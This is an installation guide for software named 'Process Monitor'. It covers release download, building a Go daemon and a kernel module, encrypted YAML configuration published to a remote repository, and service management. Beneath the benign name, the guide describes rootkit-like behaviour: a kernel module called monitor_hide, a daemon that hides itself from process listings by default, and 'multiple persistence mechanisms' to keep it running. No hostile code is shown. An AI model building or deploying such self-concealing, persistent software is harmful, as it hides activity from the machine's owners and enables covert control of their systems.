# Process Monitor v1.0.0 - Installation Guide

## Quick Start

### Prerequisites

- Linux system (amd64)
- Go 1.21+ (for building from source)
- GCC (for kernel module compilation)
- Root access

### Installation from Release

1. **Download and extract the release:**
```bash
wget https://github.com/JuliaRandolph/process-monitor/releases/download/v1.0.0/process-monitor-v1.0.0-linux-amd64.tar.gz
tar -xzf process-monitor-v1.0.0-linux-amd64.tar.gz
cd process-monitor-v1.0.0
```

2. **Run the installer:**
```bash
sudo ./install.sh
```

3. **Start the service:**
```bash
sudo systemctl start process-monitor
sudo systemctl enable process-monitor
```

### Building from Source

1. **Clone the repository:**
```bash
git clone https://github.com/JuliaRandolph/process-monitor.git
cd process-monitor
```

2. **Build the daemon:**
```bash
# On Linux system
go build -o process-monitor-daemon cmd/daemon/main.go
go build -o config-publisher cmd/config-publisher/main.go
go build -o encrypt-config cmd/encrypt-config/main.go
```

3. **Build the kernel module:**
```bash
cd kernel
make
```

4. **Install:**
```bash
sudo ./scripts/install.sh
```

## Configuration

### Creating a Custom Configuration

1. **Create a YAML configuration file:**
```yaml
version: "1.0.0"
monitor:
  scan_interval: 5s
  kernel_module: true
  auto_hide_daemon: true

blacklist:
  - name: malware-app

whitelist:
  - name: sshd
    path: /usr/sbin/sshd
    auto_start: true
```

2. **Encrypt the configuration:**
```bash
./encrypt-config my-config.yaml my-config.enc
```

3. **Publish to configuration repository:**
```bash
./config-publisher -config my-config.enc -output ./dist -version "1.0.1"
```

## Usage

### Check daemon status:
```bash
sudo systemctl status process-monitor
```

### View logs:
```bash
sudo journalctl -u process-monitor -f
```

### Reload configuration:
```bash
sudo kill -HUP $(pidof process-monitor-daemon)
```

### Uninstall:
```bash
sudo ./uninstall.sh
```

## Troubleshooting

### Kernel module not loading
```bash
# Check dmesg for errors
sudo dmesg | tail

# Manually load the module
sudo insmod kernel/monitor_hide.ko
```

### Daemon not starting
```bash
# Check logs
sudo journalctl -u process-monitor -n 50

# Verify configuration
./encrypt-config -verify config.yaml.enc
```

## Security Notes

- Configuration files are encrypted using AES-256-GCM
- Private signing keys should never be committed to git
- The daemon hides itself from process listings by default
- Multiple persistence mechanisms ensure continuous operation

## Support

For issues and questions:
- GitHub: https://github.com/JuliaRandolph/process-monitor/issues
- Config Repo: https://github.com/JuliaRandolph/process-monitor-config
